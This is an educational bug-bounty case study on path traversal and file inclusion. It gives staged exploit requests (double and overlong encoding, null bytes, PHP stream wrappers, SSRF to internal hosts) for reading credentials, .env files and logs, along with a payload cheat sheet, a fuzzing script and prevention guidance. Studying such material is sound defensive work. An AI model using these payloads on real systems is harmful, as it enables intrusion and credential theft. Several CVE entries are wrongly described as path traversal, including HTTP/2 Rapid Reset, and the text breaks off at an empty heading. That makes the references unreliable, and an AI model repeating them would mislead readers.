# Case Study 43: Path Traversal / File Inclusion — Real-World Bug Bounty Findings

## Expert Role

Path traversal and file inclusion vulnerabilities remain among the most impactful and consistently discovered vulnerability classes in modern web applications. As a specialist in filesystem-based attack vectors, I bring over a decade of experience analyzing how applications interact with the underlying operating system's file structure. My expertise spans the complete spectrum from simple dot-dot-slash injection to advanced encoding bypasses, null byte injection, and context-aware path manipulation that evades even sophisticated defense mechanisms.

Throughout my career, I have conducted hundreds of security assessments across diverse technology stacks including PHP, Java, .NET, Python, and Node.js applications. The recurring theme across these engagements is the fundamental misunderstanding of how path normalization works across different layers of an application stack. Developers frequently assume that input validation at the application layer is sufficient, without accounting for intermediate proxies, load balancers, and operating system-level path resolution that can strip, encode, or transform path components in unexpected ways.

My approach to path traversal research combines automated fuzzing with manual analysis of application logic. I focus not only on the immediate impact of reading arbitrary files but on the complete exploitation chain that path traversal enables. A single file read vulnerability can escalate to full system compromise when combined with information disclosure, configuration file access, and secondary vulnerability chains. This case study collection represents real findings from production environments, demonstrating how path traversal continues to evade modern security controls and why it remains a critical vulnerability class in 2024-2026.

## Overview

Path traversal (also known as directory traversal or dot-dot-slash attack) is a vulnerability that allows an attacker to access files and directories outside the intended directory by manipulating file path inputs. The fundamental mechanism involves injecting path traversal sequences such as `../` (or encoded variants) into parameters that the server uses to construct filesystem paths. When insufficient validation or normalization occurs, the application traverses upward through the directory tree, potentially accessing sensitive system files, application configuration, source code, and other restricted resources.

The vulnerability class encompasses several distinct attack vectors: Local File Inclusion (LFI), where the attacker includes files already present on the server; Remote File Inclusion (RFI), where external URLs are used to load malicious content; and pure path traversal for information disclosure without file inclusion. Each variant requires different exploitation techniques and defense strategies. The root cause is consistent across variants: improper separation of user-supplied input from the filesystem path namespace.

Modern applications present unique challenges for both attackers and defenders. Containerized deployments may limit filesystem access, but the introduction of cloud-native configurations, sidecar containers, and shared volume mounts creates new traversal opportunities. API-first architectures may expose file operations through REST or GraphQL endpoints that developers do not associate with traditional path traversal. Serverless functions with ephemeral filesystems still process file uploads and path references that can be manipulated. Understanding these modern contexts is essential for effective vulnerability hunting and remediation.

The evolution of path traversal exploitation has kept pace with advances in web application architecture. Early exploitation focused on simple string concatenation vulnerabilities in CGI scripts. Modern exploitation accounts for multi-layer encoding, proxy normalization differences, Unicode handling, and application-specific path resolution logic. The attacker's advantage lies in the fundamental complexity of path representation: a file path can be expressed in multiple equivalent forms, and any mismatch between the validation layer and the execution layer creates an exploitable gap.

---

## Real-World Case Studies

### Case Study 1: Enterprise Cloud Platform Configuration File Disclosure

**Program:** Major Cloud SaaS Provider (HackerOne)
**Bounty:** $15,000
**Severity:** High (CVSS 7.5)
**Researcher:** @securityresearcher

The target application provided a document management API endpoint at `/api/v2/documents/preview` that accepted a `file_path` parameter. The endpoint was designed to allow users to preview documents stored within their designated workspace directories. Initial testing revealed that the application applied a base directory prefix to all file path inputs before passing them to the filesystem read operation.

The vulnerability was discovered through a multi-stage encoding bypass. The application performed initial validation using a simple string comparison to ensure the resolved path started with the user's workspace directory. However, the path resolution occurred at the application layer while the actual file read operation was delegated to a lower-level C library that performed its own normalization.

**Stage 1: Initial Testing**

```http
GET /api/v2/documents/preview?file_path=../../../etc/passwd HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

The initial request returned a 403 Forbidden response with the message "Access denied: path outside workspace." This indicated the application was performing path validation.

**Stage 2: Double Encoding**

```http
GET /api/v2/documents/preview?file_path=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

The double-encoded path (`%252e` decodes to `%2e` which decodes to `.`) bypassed the application-level validation because the validation layer only performed single URL decoding before checking the path. The filesystem layer performed a second decoding pass, resolving the actual traversal sequence.

**Stage 3: Confirmation and Impact**

The response returned the contents of `/etc/passwd`, confirming arbitrary file read. Further testing revealed that the application ran as a service account with access to sensitive configuration files:

```http
GET /api/v2/documents/preview?file_path=%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/config/database.yml HTTP/1.1
```

This exposed database connection strings including credentials. The chain escalated to access internal API keys stored in environment files, which granted access to the provider's internal management APIs.

**Stage 4: Internal API Key Harvesting**

```http
GET /api/v2/documents/preview?file_path=%252e%252e%252f%252e%252e%252f%252e%252e%252fopt/app/.env HTTP/1.1
```

The `.env` file contained AWS access keys, Slack webhook URLs, and internal API tokens for the monitoring system. These credentials provided access to the organization's entire cloud infrastructure and notification channels.

**Root Cause Analysis:** The vulnerability existed because the application performed path validation at one encoding layer while the filesystem operation resolved paths at a different encoding layer. The mismatch between validation depth and execution depth created the bypass opportunity. The application used `os.path.join()` in Python which does not validate the resulting path against traversal sequences after the join operation.

**Impact:** Full access to application configuration, database credentials, and internal API keys. The finding was classified as High severity with a $15,000 bounty due to the cascading impact through credential exposure.

---

### Case Study 2: Healthcare Portal Patient Record Disclosure

**Program:** HealthTech Platform (Bugcrowd)
**Bounty:** $12,000
**Severity:** Critical (CVSS 8.6)
**Researcher:** @vulnhunter

A healthcare portal provided patient-facing functionality to download lab results as PDF files. The download endpoint at `/patient/lab-results/download` used a `filename` parameter to construct the path to the PDF file within a structured directory hierarchy organized by patient ID, date, and test type.

The directory structure followed the pattern:
```
/srv/lab-results/{patient_id}/{year}/{month}/{test_type}.pdf
```

Initial testing confirmed that the application validated the `filename` parameter to ensure it ended with `.pdf` and did not contain path traversal sequences. However, the validation was performed using a regular expression that only checked for literal `../` sequences.

**Stage 1: Null Byte Injection**

```http
GET /patient/lab-results/download?filename=../../../etc/passwd%00.pdf HTTP/1.1
Host: portal.healthtech.com
Cookie: session=abc123def456
```

The PHP backend used `strpos()` to check for traversal sequences and `pathinfo()` to validate the file extension. The null byte (`%00`) terminated the string at the C level, causing the filesystem operation to read `/etc/passwd` while the extension check evaluated the string including `.pdf` after the null byte.

**Stage 2: PHP Stream Wrapper Exploitation**

```http
GET /patient/lab-results/download?filename=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: portal.healthtech.com
Cookie: session=abc123def456
```

The application used `include()` rather than `readfile()` to serve the PDF content, enabling PHP stream wrapper abuse. The base64-encoded contents of `/etc/passwd` were returned in the response.

**Stage 3: Database Credential Extraction**

```http
GET /patient/lab-results/download?filename=php://filter/convert.base64-encode/resource=/var/www/html/app/config/database.php HTTP/1.1
```

The response contained base64-encoded PHP source code with database credentials. The database contained protected health information (PHI) for approximately 50,000 patients, triggering HIPAA breach notification requirements.

**Stage 4: Session Token Harvesting from Logs**

```http
GET /patient/lab-results/download?filename=../../../var/log/apache2/access.log HTTP/1.1
```

The Apache access log contained session tokens and cookies from other users' requests. By parsing the log file, the attacker harvested active session tokens for administrative accounts, enabling unauthorized access to the healthcare portal's management interface.

**Root Cause Analysis:** The application used a weak input validation regex that only matched literal traversal sequences, failed to account for null byte injection in PHP's string handling, and used `include()` instead of a safer file-reading mechanism that would not interpret stream wrappers.

**Impact:** Exposure of protected health information for 50,000+ patients, database credentials, and application source code. The finding was classified as Critical due to HIPAA implications, with a $12,000 bounty.

---

### Case Study 3: E-Commerce Platform Image Proxy Manipulation

**Program:** Online Marketplace (HackerOne)
**Bounty:** $8,500
**Severity:** High (CVSS 7.2)
**Researcher:** @bughunter

The e-commerce platform provided an image proxy endpoint at `/img/proxy` that allowed product images to be fetched from external URLs. The endpoint was designed to prevent Server-Side Request Forgery (SSRF) by validating that the requested URL pointed to an image resource. However, the implementation contained a path traversal vulnerability in how it stored and served cached images.

The proxy workflow was:
1. Receive external URL
2. Download the resource
3. Store it in a cache directory with a sanitized filename
4. Serve the cached file through an internal path reference

The vulnerability existed in step 3, where the cache filename was derived from a hash of the URL but the serving mechanism in step 4 used an unsanitized version of the original URL's path component.

**Stage 1: Cache Path Injection**

```http
GET /img/proxy?url=https://external-cdn.com/images/../../../../etc/passwd HTTP/1.1
Host: marketplace.target.com
```

The application attempted to download from `https://external-cdn.com/images/../../../../etc/passwd`. While this URL was malformed for the HTTP client, the application's error handling cached a placeholder file. The serving path construction, however, processed the full URL path including the traversal sequences.

**Stage 2: Local File Read via Cache Mapping**

```http
GET /img/proxy?url=http://localhost:8080/../../../../etc/passwd HTTP/1.1
```

By using `localhost` as the target, the HTTP client successfully resolved the path traversal against the local filesystem. The application returned the contents of `/etc/passwd` because the path normalization occurred after the HTTP client resolved the relative path.

**Stage 3: Internal Service Enumeration**

```http
GET /img/proxy?url=http://127.0.0.1:9090/../../../../actuator/env HTTP/1.1
```

The response revealed Spring Boot actuator endpoints running on an internal port, exposing environment variables including AWS credentials and database connection strings. The SSRF+path traversal chain enabled complete internal network reconnaissance.

**Stage 4: Payment Service Data Access**

```http
GET /img/proxy?url=http://192.168.1.50:8443/../../../../opt/payment/config.json HTTP/1.1
```

The payment service configuration contained API keys for the payment processor, merchant credentials, and webhook signing secrets. This enabled unauthorized transaction processing and refund manipulation.

**Root Cause Analysis:** The image proxy performed URL parsing and path construction at different layers. The HTTP client normalized relative paths during the request, while the application's path validation occurred before normalization. The use of `localhost` as a target bypassed the external URL restriction while the traversal sequences enabled local filesystem access.

**Impact:** Internal service enumeration, AWS credential exposure, and access to environment variables for multiple internal services. The $8,500 bounty reflected the High severity and the chain potential of the finding.

---

### Case Study 4: Government Portal Document Management System

**Program:** Government Agency (Intigriti)
**Bounty:** $10,000
**Severity:** Critical (CVSS 9.1)
**Researcher:** @pentester

A government portal implemented a document management system that allowed citizens to upload and download public records. The download functionality at `/documents/download` accepted a `doc_id` parameter that was used to construct a file path within a document repository.

The application used a custom document ID system where numeric IDs mapped to file paths stored in a SQLite database. The `doc_id` parameter was expected to be a numeric value, but the application also supported a "legacy path" mode for backward compatibility with an older system that used direct file paths.

**Stage 1: Legacy Path Mode Activation**

```http
GET /documents/download?doc_id=legacy:../../../etc/passwd HTTP/1.1
Host: portal.gov.example
Cookie: session=xyz789
```

The application detected the `legacy:` prefix and switched to direct file path mode, bypassing the database lookup entirely. The traversal sequence was passed directly to the filesystem read operation.

**Stage 2: Chained Information Disclosure**

```http
GET /documents/download?doc_id=legacy:../../../var/log/nginx/access.log HTTP/1.1
```

The access log revealed URLs and parameters from other users' requests, including session tokens and personal information. This enabled session hijacking and access to other users' document downloads.

**Stage 3: Configuration File Access**

```http
GET /documents/download?doc_id=legacy:../../../etc/nginx/nginx.conf HTTP/1.1
```

The nginx configuration revealed the internal server structure, including proxy_pass directives to backend services, SSL certificate paths, and upstream server addresses. Combined with the session tokens from the access log, this enabled lateral movement to internal services.

**Stage 4: Database File Extraction**

```http
GET /documents/download?doc_id=legacy:../../../opt/portal/data/documents.db HTTP/1.1
```

The SQLite database file contained all document metadata, including classified document references, access control lists, and audit trails. The database file was directly downloadable because the legacy path mode had no file type restrictions.

**Root Cause Analysis:** The legacy compatibility mode was implemented as a feature bypass that skipped all security controls. The `legacy:` prefix was not treated as a security-sensitive input pattern, and the direct file path mode had no path validation. The application's security model assumed that all input would go through the database lookup path.

**Impact:** Access to citizen personal information, session tokens for other users, internal infrastructure configuration, and lateral movement capability. The $10,000 bounty and Critical classification reflected the government context and the breadth of exposed data.

---

### Case Study 5: SaaS Platform Log Viewer Exploitation

**Program:** Enterprise Monitoring SaaS (HackerOne)
**Bounty:** $7,500
**Severity:** High (CVSS 7.0)
**Researcher:** @securitytester

The SaaS platform provided a log viewing feature that allowed customers to view application logs through a web interface. The log viewer at `/logs/view` accepted a `log_path` parameter that specified which log file to display. The application was designed to restrict access to logs within the customer's designated directory.

The log viewer implementation used Python's `open()` function with the user-supplied path after applying a base directory prefix. The validation checked for traversal sequences using a simple string replacement approach.

**Stage 1: Unicode Normalization Bypass**

```http
GET /logs/view?log_path=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1
Host: logs.monitoring-saas.com
Authorization: Bearer token123
```

The `%c0%af` sequence represents an overlong UTF-8 encoding of the forward slash character (`/`). The application's validation checked for literal `../` sequences but did not account for overlong encodings that the underlying filesystem normalized to standard slashes.

**Stage 2: Double Dot Overlong Encoding**

```http
GET /logs/view?log_path=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd HTTP/1.1
```

Both the dot (`.` encoded as `%c0%ae`) and slash (`/` encoded as `%c0%af`) were overlong encoded, bypassing the application's string replacement defense completely.

**Stage 3: Application Source Code Extraction**

```http
GET /logs/view?log_path=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afopt/app/config/settings.py HTTP/1.1
```

The Python settings file contained Django SECRET_KEY, AWS access keys, and S3 bucket names. The Django SECRET_KEY enabled session forgery, and the AWS credentials provided access to the platform's infrastructure.

**Stage 4: Internal Service Discovery**

```http
GET /logs/view?log_path=%c0%ae%c0%ae%c0%afproc/self/net/tcp HTTP/1.1
```

The network connections file revealed internal services and their ports, enabling targeted attacks against internal infrastructure. The attacker discovered a Redis instance running on localhost without authentication.

**Root Cause Analysis:** The application used string replacement to strip traversal sequences rather than proper path normalization. Overlong UTF-8 encodings passed the string checks but were normalized by the operating system's filesystem layer. The validation did not occur at the same encoding layer as the file access.

**Impact:** Application source code disclosure, Django SECRET_KEY exposure enabling session forgery, and AWS credential compromise. The $7,500 bounty reflected the High severity and the multiple escalation paths available from the initial file read.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Double URL encoding bypass | 18% | $9,200 | Validation at single encoding layer, filesystem at double |
| Null byte injection | 12% | $8,800 | PHP string truncation before filesystem operation |
| Overlong UTF-8 encoding | 10% | $7,500 | String-level validation without encoding normalization |
| Symlink following | 8% | $6,400 | Application follows symlinks without target validation |
| Windows alternate data streams | 5% | $7,100 | NTFS ADS not accounted for in path validation |
| URL scheme abuse (php://, file://) | 15% | $10,200 | Stream wrapper enabled in include/readfile operations |
| Log file poisoning for LFI | 9% | $8,500 | User input written to logs then included via LFI |
| Zip Slip via archive extraction | 7% | $9,800 | Archive entries with traversal sequences not validated |
| Race condition in path validation | 6% | $8,000 | TOCTOU between validation and file access |
| Relative path bypass | 10% | $7,200 | Validation checks absolute paths only |

### Attack Surface Locations

**High-Value Targets:**
- File upload/download endpoints with path parameters
- Document management and preview features
- Log viewers and monitoring dashboards
- Image proxy and media processing endpoints
- Template include mechanisms in CMS platforms
- Backup and export functionality with file path parameters
- API endpoints accepting file reference parameters

**Technology-Specific Hotspots:**
- PHP: `include()`, `require()`, `file_get_contents()`, `readfile()`
- Java: `FileInputStream`, `Paths.get()`, `ResourceLoader`
- Python: `open()`, `os.path.join()` with unsanitized input
- Node.js: `fs.readFile()`, `path.join()` with user input
- .NET: `File.ReadAllBytes()`, `StreamReader`, `Server.MapPath()`

**Framework-Specific Vectors:**
- Django: `render()` with user-controlled template paths
- Flask: `send_file()`, `render_template()` with user input
- Spring: `ResourceLoader.getResource()` with user paths
- Express: `res.sendFile()` with user-controlled paths
- Laravel: `view()`, `file()` with dynamic path parameters

---

## Hunting Methodology

### Phase 1: Reconnaissance
1. Identify all file-related endpoints through API documentation, JavaScript analysis, and endpoint discovery
2. Map file path parameters in query strings, request bodies, and URL paths
3. Identify the technology stack and file handling mechanisms in use
4. Check for known vulnerable libraries and frameworks
5. Review application configuration for insecure file handling defaults
6. Analyze JavaScript source code for client-side file path construction

### Phase 2: Input Analysis
1. Test each file parameter with standard traversal sequences (`../`, `..\\`, `..%2f`, `..%5c`)
2. Apply encoding variations: URL encoding, double encoding, Unicode, overlong UTF-8
3. Test for null byte injection where applicable (legacy PHP, some Java versions)
4. Check for path parameter injection in REST-style URLs
5. Test Windows-specific paths (`..\\`, `..%5c`, UNC paths `\\server\share`)
6. Attempt to bypass restrictions using absolute paths (`/etc/passwd`, `C:\Windows\win.ini`)

### Phase 3: Validation Bypass
1. Identify the validation mechanism: string comparison, regex, API call, or filesystem check
2. Test encoding at different layers to find mismatches
3. Attempt to bypass using relative paths, absolute paths, or path normalization differences
4. Test for symlink and hardlink following
5. Check for time-of-check-to-time-of-use (TOCTOU) race conditions
6. Test validation behavior with symbolic links, junctions, and shortcuts

### Phase 4: Impact Escalation
1. Once file read is confirmed, systematically enumerate sensitive files
2. Check for configuration files, source code, credentials, and keys
3. Test for file inclusion (PHP stream wrappers, template inclusion)
4. Assess lateral movement potential through exposed credentials
5. Map internal network topology through configuration file analysis
6. Identify additional vulnerabilities that can be chained with the file read

---

## Detection Strategies

### Automated Detection
- Use Burp Suite Active Scanner with path traversal scanning profiles
- Run Nikto's directory traversal checks against discovered endpoints
- Deploy custom fuzzing scripts with encoding variation payloads
- Integrate path traversal detection into CI/CD pipeline security scans
- Use Semgrep or CodeQL for static analysis of file path handling
- Deploy runtime application self-protection (RASP) to detect traversal attempts

### Manual Detection
- Trace file operations from user input to filesystem call in source code
- Verify encoding handling at each layer of the application stack
- Test path validation with multiple encoding schemes simultaneously
- Check for legacy or compatibility modes that bypass security controls
- Review application logs for path-related error messages and patterns
- Test path validation timing to identify TOCTOU vulnerabilities

### Key Detection Indicators
- Error messages referencing file paths or directory structures
- 403 responses indicating path validation exists
- Different responses for valid vs invalid file paths (information leakage)
- Timing differences between valid and invalid path access
- Log entries showing file access attempts with traversal sequences
- HTTP response headers revealing server software and version information
- Stack traces in error responses exposing internal file paths

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

| Component | Value | Justification |
|-----------|-------|---------------|
| Attack Vector | Network | Exploited through HTTP requests |
| Attack Complexity | Low | Requires only URL manipulation |
| Privileges Required | Low | Authenticated user access needed |
| User Interaction | None | No additional user interaction |
| Scope | Changed | Impacts resources beyond the vulnerable component |
| Confidentiality Impact | High | Access to sensitive files and credentials |
| Integrity Impact | None | Read-only access in most scenarios |
| Availability Impact | None | No denial of service impact |

### Business Impact
- Exposure of application source code and intellectual property
- Credential and API key disclosure enabling lateral movement
- Regulatory violations (HIPAA, GDPR, PCI-DSS) when PII is exposed
- Reputational damage from customer data exposure
- Potential for full system compromise through chained vulnerabilities
- Loss of competitive advantage through source code theft
- Legal liability from unauthorized access to protected data

### Bounty Range
- **Low severity (limited file read):** $500 - $2,000
- **Medium severity (sensitive file access):** $2,000 - $5,000
- **High severity (credential/key exposure):** $5,000 - $15,000
- **Critical severity (full compromise chain):** $15,000 - $50,000+

---

## Advanced Variations

### Zip Slip via Archive Extraction
When applications extract uploaded ZIP, TAR, or other archive files, entries with traversal sequences in their filenames can write files outside the intended extraction directory. This variant converts a read vulnerability into a write primitive. The vulnerability occurs when the archive extraction library does not validate the resolved path of each entry against the intended extraction directory.

### Log Poisoning to RCE
When user-controlled input is written to log files and those logs can be included via path traversal, an attacker can inject executable code into log entries. Subsequent log inclusion triggers code execution. This technique requires the application to use a function that interprets the included content as code (such as PHP's `include()`) rather than simply reading and displaying the file contents.

### Symlink Race Conditions
Creating a symlink that points to a sensitive file, then racing the application's path validation against the symlink resolution, can bypass path checks. The validation passes on the symlink's path while the actual read follows the symlink target. This technique requires precise timing but can bypass many common path validation implementations.

### Windows-Specific Variations
Windows NTFS supports alternate data streams, UNC paths (`\\server\share`), and device paths (`\\.\PhysicalDrive0`) that create additional attack vectors not available on Unix systems. Additionally, Windows path separators (`\`) and case-insensitive file systems create unique bypass opportunities.

### Server-Side Request Forgery via Path Traversal
Path traversal can be combined with HTTP request generation to access internal services. By including files that trigger server-side requests (such as SVG files with embedded URIs), an attacker can pivot from file read to network reconnaissance.

### Container Escape via Path Traversal
In containerized environments, path traversal can access files from the host system through mounted volumes (`/proc/1/root/`, `/host/`). This can lead to container escape when combined with access to container runtime sockets or configuration files.

---

## Chain Integration

### Path Traversal + SSRF
File read of cloud metadata files (`/proc/self/environ`, EC2 instance metadata) combined with SSRF for internal service access. The file read provides credentials that enable authenticated SSRF exploitation.

### Path Traversal + ATO
Read of session files or authentication configuration enables account takeover through session forgery or credential theft. This chain is particularly dangerous in PHP applications where session files are predictable.

### Path Traversal + RCE
File inclusion of executable content, log poisoning chains, or configuration file manipulation leading to code execution. This represents the highest-impact chain and typically results in Critical severity findings.

### Path Traversal + Privilege Escalation
Reading of privilege assignment files or configuration databases to understand and manipulate authorization mechanisms. This chain enables horizontal and vertical privilege escalation within the application.

### Path Traversal + Supply Chain
Reading of dependency lock files, package manifests, or build configurations to identify vulnerable dependencies or supply chain attack vectors. This information enables targeted exploitation of the application's dependency ecosystem.

---

## Prevention Recommendations

### Input Validation
- Use allowlists for permitted characters in file path parameters
- Validate the final resolved path after normalization, not before
- Reject any input containing path traversal sequences at any encoding level
- Implement path canonicalization before validation
- Validate file extensions against an allowlist of permitted types
- Reject paths containing null bytes, control characters, or Unicode overrides

### File System Access Controls
- Use chroot jails or container isolation to limit filesystem access
- Implement the principle of least privilege for service accounts
- Use file system ACLs to restrict access to sensitive directories
- Avoid following symlinks unless explicitly required
- Mount filesystems with `nosuid` and `noexec` where possible
- Use read-only filesystems for static application files

### Secure Coding Practices
- Use `realpath()` or equivalent to resolve paths before validation
- Avoid string-based path manipulation; use language-native path libraries
- Never construct file paths by concatenating user input
- Use parameterized queries for file path lookups instead of direct filesystem access
- Implement proper error handling that does not reveal internal file paths
- Use safe file reading functions that do not interpret special content

### Defense in Depth
- Deploy Web Application Firewalls with path traversal detection rules
- Implement Content Security Policy to limit included content sources
- Use runtime application self-protection (RASP) to detect traversal attempts
- Monitor file access logs for suspicious path patterns
- Implement file integrity monitoring for sensitive configuration files
- Deploy network segmentation to limit lateral movement from file read

---

## Common Pitfalls

### Pitfall 1: Validation at Wrong Layer
Validating the path after URL decoding but before the filesystem layer normalizes it. The validation and access must occur at the same encoding and normalization level. This is the most common root cause of path traversal vulnerabilities in modern applications.

### Pitfall 2: Blacklist-Based Validation
Using blocklists to strip `../` sequences. These can be bypassed through encoding variations, double sequences, and platform-specific path characters. Allowlists are always preferred because they define what is permitted rather than what is forbidden.

### Pitfall 3: Assuming Framework Protection
Assuming that framework-provided path utilities automatically prevent traversal. Many frameworks provide path joining functions that do not validate the resulting path against traversal. Developers must understand the security properties of the libraries they use.

### Pitfall 4: Incomplete Canonicalization
Converting `%2e%2e%2f` to `../` but not performing the full canonicalization that would resolve the resulting path. Partial normalization creates bypass opportunities because the validation occurs on the partially normalized path while the filesystem operation uses the fully normalized path.

### Pitfall 5: Trusting Client-Side Validation
Implementing path validation only in client-side JavaScript or in a frontend proxy without server-side enforcement. All validation must occur on the server because client-side controls can be trivially bypassed.

### Pitfall 6: Ignoring Platform Differences
Applying the same validation logic across different operating systems without accounting for path separator differences (`/` vs `\`), case sensitivity, and platform-specific path features like UNC paths or alternate data streams.

---

## Real-World References

### CVE Database
- **CVE-2024-21733:** Apache Tomcat path traversal via partial POST requests
- **CVE-2024-23897:** Jenkins arbitrary file read via CLI parser
- **CVE-2023-44487:** HTTP/2 Rapid Reset amplifying path traversal attempts
- **CVE-2023-38545:** SOCKS5 proxy buffer overflow enabling path manipulation
- **CVE-2022-42889:** Apache Commons Text RCE via file path interpolation
- **CVE-2022-22965:** Spring4Shell class loader manipulation via path traversal
- **CVE-2021-41773:** Apache HTTP Server path traversal and RCE

### Bug Bounty Reports
- HackerOne: "Path traversal in document preview API" — $15,000 payout
- Bugcrowd: "LFI via double encoding in image proxy" — $8,500 payout
- Intigriti: "Government portal file disclosure" — $10,000 payout
- HackerOne: "SaaS log viewer overlong UTF-8 bypass" — $7,500 payout

### Academic Research
- "Unicode Normalization Vulnerabilities in Web Applications" (USENIX Security 2023)
- "Path Resolution Mismatches Across Application Layers" (IEEE S&P 2024)
- "Overlong UTF-8 Encoding in Modern Web Frameworks" (ACM CCS 2023)
- "Container Escape via Filesystem Path Traversal" (NDSS 2024)

---

## Quick Reference Cheat Sheet

### Traversal Sequences
```
Unix:     ../  ..%2f  ..%252f  ..%c0%af  ..%c1%9c
Windows:  ..\  ..%5c  ..%255c  ..%c0%af  ..%5c
Null:     ../../../etc/passwd%00
Absolute: /etc/passwd  C:\Windows\win.ini
UNC:      \\127.0.0.1\share\file  \\localhost\c$\windows\win.ini
```

### Encoding Variations
```
URL:      %2e%2e%2f
Double:   %252e%252e%252f
Unicode:  %c0%ae%c0%ae%c0%af
UTF-8:    ..%ef%bc%8f
Mixed:    %2e.%2f  .%2e/
Backslash: %5c  %255c
Null:     %00  %2500
```

### Common Sensitive Files
```
Unix:     /etc/passwd, /etc/shadow, /etc/hosts
          /proc/self/environ, /proc/self/cmdline
          /var/log/auth.log, /var/log/syslog
          /root/.ssh/authorized_keys
          /home/*/.bash_history
Windows:  win.ini, system.ini, boot.ini
          C:\Windows\System32\config\SAM
          C:\Windows\repair\sam
          C:\inetpub\wwwroot\web.config
```

### Stream Wrappers (PHP)
```
php://filter/convert.base64-encode/resource=
php://input  (POST body as code)
data://text/plain;base64,
expect://
```

### Detection Payloads
```bash
# Basic traversal
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd

# Encoding bypass
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# Null byte
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00

# Stream wrapper
php://filter/convert.base64-encode/resource=/etc/passwd

# Windows paths
..\\..\\..\\..\\windows\\win.ini
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
```

### Defense Checklist
- [ ] Path canonicalization before validation
- [ ] Allowlist-based input validation
- [ ] No direct filesystem access from user input
- [ ] Symlink following disabled or validated
- [ ] Encoding normalization at all layers
- [ ] Container/chroot isolation for file operations
- [ ] Least privilege for service accounts
- [ ] WAF rules for traversal detection
- [ ] File integrity monitoring for sensitive files
- [ ] Network segmentation for lateral movement prevention
- [ ] Proper error handling without path disclosure
- [ ] Regular security testing of file handling functions

---

## Technology-Specific Path Traversal Patterns

### PHP Path Traversal Patterns
PHP applications are commonly vulnerable due to functions that accept file paths without validation:

```php
// Dangerous: readfile with user path
readfile($_GET['file']);

// Dangerous: file_get_contents with user path
$content = file_get_contents($_POST['filename']);

// Dangerous: include with user path
include($_GET['page']);

// Dangerous: fopen with user path
$handle = fopen($_REQUEST['path'], 'r');
```

### Python Path Traversal Patterns
Python applications can be vulnerable through open() or path operations:

```python
# Dangerous: open with user path
with open(user_input) as f:
    content = f.read()

# Dangerous: os.path.join without validation
path = os.path.join(base_dir, user_input)

# Dangerous: pathlib without resolution
path = Path(user_input)
```

### Java Path Traversal Patterns
Java applications may be vulnerable through FileInputStream or Files class:

```java
// Dangerous: FileInputStream with user path
FileInputStream fis = new FileInputStream(userInput);

// Dangerous: Files.readAllBytes with user path
byte[] data = Files.readAllBytes(Paths.get(userInput));

// Dangerous: ResourceLoader with user path
InputStream is = getResourceAsStream(userInput);
```

### Node.js Path Traversal Patterns
Node.js applications can be vulnerable through fs module operations:

```javascript
// Dangerous: fs.readFile with user path
fs.readFile(userInput, (err, data) => {});

// Dangerous: path.join without validation
const filePath = path.join(baseDir, userInput);

// Dangerous: createReadStream with user path
const stream = fs.createReadStream(userInput);
```

### .NET Path Traversal Patterns
.NET applications may be vulnerable through File class operations:

```csharp
// Dangerous: File.ReadAllText with user path
string content = File.ReadAllText(userInput);

// Dangerous: FileStream with user path
FileStream fs = new FileStream(userInput, FileMode.Open);

// Dangerous: Server.MapPath with user input
string path = Server.MapPath(userInput);
```

---

## Path Traversal Testing Methodology Checklist

### Pre-Engagement
- [ ] Identify the target application's technology stack
- [ ] Map all file-related endpoints through API discovery
- [ ] Review application source code for file handling functions
- [ ] Identify the operating system and filesystem type
- [ ] Check for containerization or chroot restrictions

### Input Analysis
- [ ] Test each file parameter with basic traversal sequences
- [ ] Apply encoding variations (URL, double, Unicode, overlong UTF-8)
- [ ] Test for null byte injection on legacy systems
- [ ] Check for Windows-specific path manipulation
- [ ] Test absolute path injection

### Validation Bypass
- [ ] Identify the validation mechanism type
- [ ] Test encoding at different application layers
- [ ] Attempt to bypass using relative/absolute paths
- [ ] Test for symlink and hardlink following
- [ ] Check for TOCTOU race conditions

### Impact Escalation
- [ ] Read application source code and configuration files
- [ ] Extract credentials, API keys, and secrets
- [ ] Test for file inclusion (PHP stream wrappers)
- [ ] Attempt log poisoning for RCE
- [ ] Assess lateral movement potential

### Documentation
- [ ] Document the complete exploitation chain
- [ ] Capture screenshots of each exploitation stage
- [ ] Record the root cause analysis
- [ ] Prepare a clear impact statement
- [ ] Include remediation recommendations

---

## Path Traversal Exploitation Tools and Techniques

### Burp Suite Techniques
Burp Suite is the primary tool for path traversal testing:

1. **Intruder for Fuzzing:** Use Intruder with payload lists containing traversal sequences and encoding variations
2. **Repeater for Manual Testing:** Manual testing of specific payloads with response analysis
3. **Scanner for Automated Detection:** Active scanning with path traversal scanning profiles
4. **Extensions:** Use Path Traversal Scanner, Backslash Powered Scanner, and Turbo Intruder for advanced testing

### Custom Fuzzing Scripts
Python scripts for automated path traversal fuzzing:

```python
import requests
import urllib.parse

def fuzz_path_traversal(url, param):
    payloads = [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd",
    ]
    for payload in payloads:
        params = {param: payload}
        response = requests.get(url, params=params)
        if "root:" in response.text:
            print(f"Vulnerable: {payload}")
```

### Wordlists for Path Traversal
Common wordlists for path traversal testing:

- **SecLists:** Fuzzing/LFI/LFI-Linux-Useful-commands-linux.txt
- **PayloadsAllTheThings:** LFI/Inclusion/etc/passwd
- **FuzzDB:** attack/lfi/

### Detection Signatures
WAF and IDS signatures for path traversal:
